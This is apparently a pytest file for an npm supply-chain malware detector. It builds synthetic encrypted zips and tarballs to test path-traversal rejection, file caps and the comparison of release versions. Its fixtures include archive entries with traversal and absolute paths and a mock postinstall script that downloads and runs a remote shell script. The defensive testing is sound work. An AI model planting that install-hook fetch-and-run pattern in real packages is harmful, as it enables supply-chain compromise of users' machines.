"""Tests for in-memory zip loader and ReleaseContents abstraction (Stage 3a).

Rule 6 & Rule 7:
- All archives are synthetic, created purely in memory / temp inside the test.
- No real malware samples are used.
- Password is the standard dataset password "infected".
"""

from __future__ import annotations

import binascii
import io
import json
import os
import tarfile
from datetime import UTC, datetime
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from release_sentinel.eval import (
    analyze_eval_pair,
    compute_payload_hashes,
    parse_discovery_date_as_of,
)
from release_sentinel.extractor import (
    ExtractionConfig,
    ExtractionError,
    ReleaseContents,
    extract_release_in_memory,
)
from release_sentinel.models import Decision
from release_sentinel.registry import NpmRegistryClient
from release_sentinel.zip_loader import load_zip_release

_CRCTABLE = []
for i in range(256):
    c = i
    for _ in range(8):
        c = (c >> 1) ^ 0xEDB88320 if (c & 1) else (c >> 1)
    _CRCTABLE.append(c)


def make_synthetic_encrypted_zip(
    files: dict[str, bytes],
    password: bytes = b"infected",
) -> bytes:
    """Create a synthetic ZipCrypto-encrypted ZIP file in memory."""
    import struct

    body = bytearray()
    cdir = bytearray()

    for filename, data in files.items():
        fn_bytes = filename.encode("utf-8")
        crc = binascii.crc32(data) & 0xFFFFFFFF
        uncomp_size = len(data)

        key0, key1, key2 = 305419896, 591751049, 878082192

        def update_keys(b: int) -> None:
            nonlocal key0, key1, key2
            key0 = (key0 >> 8) ^ _CRCTABLE[(key0 ^ b) & 0xFF]
            key1 = ((key1 + (key0 & 0xFF)) * 134775813 + 1) & 0xFFFFFFFF
            key2 = (key2 >> 8) ^ _CRCTABLE[(key2 ^ (key1 >> 24)) & 0xFF]

        for b in password:
            update_keys(b)

        header = bytearray(os.urandom(11))
        header.append((crc >> 24) & 0xFF)

        enc_payload = bytearray()
        for b in header:
            k = key2 | 2
            keystream = ((k * (k ^ 1)) >> 8) & 0xFF
            enc_payload.append(b ^ keystream)
            update_keys(b)

        for b in data:
            k = key2 | 2
            keystream = ((k * (k ^ 1)) >> 8) & 0xFF
            enc_payload.append(b ^ keystream)
            update_keys(b)

        comp_size = len(enc_payload)
        local_header_offset = len(body)

        # Local file header
        lfh = struct.pack(
            "<4sHHHHHIIIHH",
            b"PK\x03\x04",
            20,  # version needed
            1,  # flag: encrypted
            0,  # method: stored
            0,
            0,  # time, date
            crc,  # plaintext CRC
            comp_size,  # compressed size
            uncomp_size,  # uncompressed size
            len(fn_bytes),
            0,  # extra length
        )
        body.extend(lfh)
        body.extend(fn_bytes)
        body.extend(enc_payload)

        # Central directory header
        cdh = struct.pack(
            "<4sHHHHHHIIIHHHHHII",
            b"PK\x01\x02",
            20,  # version made by
            20,  # version needed
            1,  # flag: encrypted
            0,  # method: stored
            0,
            0,  # time, date
            crc,  # plaintext CRC
            comp_size,
            uncomp_size,
            len(fn_bytes),
            0,  # extra len
            0,  # comment len
            0,  # disk num
            0,  # internal attr
            0,  # external attr
            local_header_offset,
        )
        cdir.extend(cdh)
        cdir.extend(fn_bytes)

    cdir_offset = len(body)
    cdir_size = len(cdir)
    body.extend(cdir)

    # End of central directory record
    eocd = struct.pack(
        "<4sHHHHIIH",
        b"PK\x05\x06",
        0,
        0,
        len(files),
        len(files),
        cdir_size,
        cdir_offset,
        0,
    )
    body.extend(eocd)
    return bytes(body)


def make_synthetic_tarball(files: dict[str, bytes]) -> bytes:
    """Create a synthetic .tar.gz tarball in memory."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in files.items():
            ti = tarfile.TarInfo(name=name)
            ti.size = len(data)
            ti.mtime = 1700000000
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


class TestZipLoaderSafety:
    """Tests for security validation in load_zip_release."""

    def test_load_valid_encrypted_zip(self) -> None:
        files = {
            "package/package.json": b'{"name": "test-pkg", "version": "1.0.1"}',
            "package/index.js": b'console.log("hello");',
        }
        zip_bytes = make_synthetic_encrypted_zip(files, password=b"infected")
        rc = load_zip_release(zip_bytes, password=b"infected")

        assert isinstance(rc, ReleaseContents)
        assert "package.json" in rc.files
        assert "index.js" in rc.files
        assert rc.read_text("index.js") == 'console.log("hello");'
        pj = rc.package_json()
        assert pj is not None
        assert pj["version"] == "1.0.1"
        assert not rc.capped

    def test_wrong_password_raises(self) -> None:
        files = {"package/package.json": b'{"name": "test-pkg"}'}
        zip_bytes = make_synthetic_encrypted_zip(files, password=b"secret")
        with pytest.raises(ExtractionError, match="Failed to decrypt|Failed to read"):
            load_zip_release(zip_bytes, password=b"wrong")

    def test_path_traversal_rejected(self) -> None:
        files = {"package/../evil.js": b'malicious code'}
        zip_bytes = make_synthetic_encrypted_zip(files)
        with pytest.raises(ExtractionError, match="Path traversal detected"):
            load_zip_release(zip_bytes)

    def test_absolute_path_rejected(self) -> None:
        files = {"/etc/shadow": b'data'}
        zip_bytes = make_synthetic_encrypted_zip(files)
        with pytest.raises(ExtractionError, match="Refusing absolute path"):
            load_zip_release(zip_bytes)

    def test_windows_absolute_path_rejected(self) -> None:
        files = {"D:/evil.bat": b'data'}
        zip_bytes = make_synthetic_encrypted_zip(files)
        with pytest.raises(ExtractionError, match="Refusing Windows absolute path"):
            load_zip_release(zip_bytes)

    def test_nested_prefix_stripped(self) -> None:
        files = {
            "tmp/abc123xyz/test-pkg/package/package.json": (
                b'{"name": "test-pkg", "version": "2.0.0"}'
            ),
            "tmp/abc123xyz/test-pkg/package/lib/core.js": b'module.exports = {};',
            "tmp/abc123xyz/test-pkg/package_info-test-pkg.json": b'{"_id": "test-pkg"}',
        }
        zip_bytes = make_synthetic_encrypted_zip(files)
        rc = load_zip_release(zip_bytes)

        assert "package.json" in rc.files
        assert "lib/core.js" in rc.files
        # Metadata file outside package root should be excluded
        assert "package_info-test-pkg.json" not in rc.files
        assert not any("tmp/" in p for p in rc.files)

    def test_soft_cap_triggered(self) -> None:
        # Create 10 files with max_files=5
        files = {"package/package.json": b'{"name": "test-pkg"}'}
        for i in range(10):
            files[f"package/asset_{i}.txt"] = b"some text"
        files["package/main.js"] = b"console.log(1);"

        zip_bytes = make_synthetic_encrypted_zip(files)
        cfg = ExtractionConfig(max_files=5, soft_cap=True)
        rc = load_zip_release(zip_bytes, config=cfg)

        assert rc.capped
        assert rc.cap_reason is not None
        # Only priority files (package.json, .js) should be kept
        assert "package.json" in rc.files
        assert "main.js" in rc.files
        assert "asset_0.txt" not in rc.files


class TestTarballInMemory:
    """Tests for extract_release_in_memory."""

    def test_tarball_in_memory_valid(self) -> None:
        files = {
            "package/package.json": b'{"name": "tar-pkg", "version": "1.0.0"}',
            "package/index.js": b'module.exports = 42;',
        }
        tar_bytes = make_synthetic_tarball(files)
        rc = extract_release_in_memory(tar_bytes)

        assert isinstance(rc, ReleaseContents)
        assert "package.json" in rc.files
        assert "index.js" in rc.files
        assert rc.package_json()["version"] == "1.0.0"

    def test_tarball_in_memory_path_traversal_rejected(self) -> None:
        files = {"package/../../evil.sh": b'bad'}
        tar_bytes = make_synthetic_tarball(files)
        with pytest.raises(ExtractionError, match="Path traversal detected"):
            extract_release_in_memory(tar_bytes)


class TestEvalPairAnalysis:
    """Tests for analyze_eval_pair library function."""

    def test_discovery_date_parsing(self) -> None:
        dt = parse_discovery_date_as_of("2025-11-24")
        assert dt == datetime(2025, 11, 24, 23, 59, 59, tzinfo=UTC)

    def test_analyze_eval_pair_blocks_on_compromised_script(self, tmp_path: Path) -> None:
        # Old benign version (1.0.0): clean index.js
        old_tarball_bytes = make_synthetic_tarball({
            "package/package.json": b'{"name": "eval-pkg", "version": "1.0.0"}',
            "package/index.js": b'module.exports = function() { return 1; };',
        })
        tarball_file = tmp_path / "eval-pkg-1.0.0.tgz"
        tarball_file.write_bytes(old_tarball_bytes)

        postinstall_code = (
            b"// " + b"padding " * 20 + b"\n"
            b"const https = require('https');\n"
            b"const cp = require('child_process');\n"
            b"https.get('https://example.com/setup.sh', (res) => {\n"
            b"  cp.exec('sh setup.sh');\n"
            b"});\n"
        )

        new_zip_bytes = make_synthetic_encrypted_zip({
            "package/package.json": json.dumps({
                "name": "eval-pkg",
                "version": "1.0.1",
                "scripts": {
                    "postinstall": "node setup.js"
                }
            }).encode("utf-8"),
            "package/setup.js": postinstall_code,
        })
        zip_file = tmp_path / "2025-11-24-eval-pkg-v1.0.1.zip"
        zip_file.write_bytes(new_zip_bytes)

        # Mock NpmRegistryClient
        mock_client = MagicMock(spec=NpmRegistryClient)
        mock_client.download_tarball.return_value = tarball_file

        result = analyze_eval_pair(
            package="eval-pkg",
            old_version="1.0.0",
            zip_path=zip_file,
            discovery_date="2025-11-24",
            registry_client=mock_client,
        )

        assert result.package == "eval-pkg"
        assert result.old_version == "1.0.0"
        assert result.new_version == "1.0.1"
        assert result.decision == Decision.BLOCK
        ev_ids = [e.id for e in result.evidence]
        assert "install_script_added" in ev_ids
        assert "process_exec" in ev_ids
        assert len(result.payload_hashes) == 1

    def test_analyze_eval_pair_without_client_resolves_dependencies(self, tmp_path: Path) -> None:
        """Calling analyze_eval_pair without a client creates an owned client that remains open."""
        old_tarball_bytes = make_synthetic_tarball({
            "package/package.json": (
                b'{"name": "eval-dep-pkg", "version": "1.0.0", "dependencies": {}}'
            ),
            "package/index.js": b"module.exports = 1;",
        })
        tarball_file = tmp_path / "eval-dep-pkg-1.0.0.tgz"
        tarball_file.write_bytes(old_tarball_bytes)

        dep_tarball_bytes = make_synthetic_tarball({
            "package/package.json": (
                b'{"name": "added-dep", "version": "1.0.0", "scripts": {"postinstall": "exit 1"}}'
            ),
            "package/index.js": b"module.exports = 2;",
        })
        dep_tarball_file = tmp_path / "added-dep-1.0.0.tgz"
        dep_tarball_file.write_bytes(dep_tarball_bytes)

        new_zip_bytes = make_synthetic_encrypted_zip({
            "package/package.json": json.dumps({
                "name": "eval-dep-pkg",
                "version": "1.0.1",
                "dependencies": {"added-dep": "^1.0.0"},
            }).encode("utf-8"),
            "package/index.js": b"module.exports = 1;",
        })
        zip_file = tmp_path / "2025-11-24-eval-dep-pkg-v1.0.1.zip"
        zip_file.write_bytes(new_zip_bytes)

        with patch("release_sentinel.eval.NpmRegistryClient") as mock_cls:
            mock_client = MagicMock()
            mock_cls.return_value = mock_client
            mock_client.download_tarball.side_effect = [tarball_file, dep_tarball_file]
            mock_client.get_metadata.return_value = {
                "versions": {
                    "1.0.0": {
                        "version": "1.0.0",
                        "dist": {"tarball": "http://example.com/added-dep-1.0.0.tgz"},
                    }
                },
                "time": {"1.0.0": "2025-01-01T00:00:00.000Z"},
            }

            result = analyze_eval_pair(
                package="eval-dep-pkg",
                old_version="1.0.0",
                zip_path=zip_file,
                discovery_date="2025-11-24",
                registry_client=None,  # Owned client created inside
            )

            # Check that owned client was closed in finally
            mock_client.close.assert_called_once()
            assert result.dependencies_added_count == 1
            assert result.dependencies_resolved_live == 1
            assert result.baseline_error is None


class TestComputePayloadHashes:
    """Tests for Stage 3b campaign clustering payload hashing."""

    def test_ignores_package_json_readme_license_map_and_under_200_bytes(self) -> None:
        old_release = ReleaseContents(
            files={
                "package.json": b'{"name": "test", "version": "1.0.0"}',
                "README.md": b"Old readme content " * 20,
                "LICENSE": b"MIT License " * 20,
                "bundle.js.map": b'{"version": 3}' * 50,
                "small.js": b'console.log("hi");',  # < 200 bytes
                "unchanged.js": b"const x = 1;\n" * 30,  # >= 200 bytes
            }
        )
        new_release = ReleaseContents(
            files={
                "package.json": (
                    b'{"name": "test", "version": "1.0.1", "scripts": {"postinstall": "bad"}}'
                ),
                "README.md": b"New readme content " * 20,
                "LICENSE.txt": b"Apache License " * 20,
                "bundle.js.map": b'{"version": 3, "mappings": ""}' * 50,
                "small.js": b'console.log("hello world updated");',  # < 200 bytes
                "unchanged.js": b"const x = 1;\n" * 30,  # unchanged
                "changed_payload.js": b"console.log('malicious payload added');\n" * 20,
                "sub/new_module.js": b"function doBadThings() { return true; }\n" * 20,
            }
        )

        hashes = compute_payload_hashes(old_release, new_release)
        assert len(hashes) == 2
        import hashlib

        h1 = hashlib.sha256(new_release.files["changed_payload.js"]).hexdigest()
        h2 = hashlib.sha256(new_release.files["sub/new_module.js"]).hexdigest()
        assert hashes == sorted([h1, h2])

    def test_empty_when_no_qualifying_files(self) -> None:
        old = ReleaseContents(files={"index.js": b"const a = 1;\n" * 20})
        new = ReleaseContents(files={"index.js": b"const a = 1;\n" * 20})
        assert compute_payload_hashes(old, new) == []

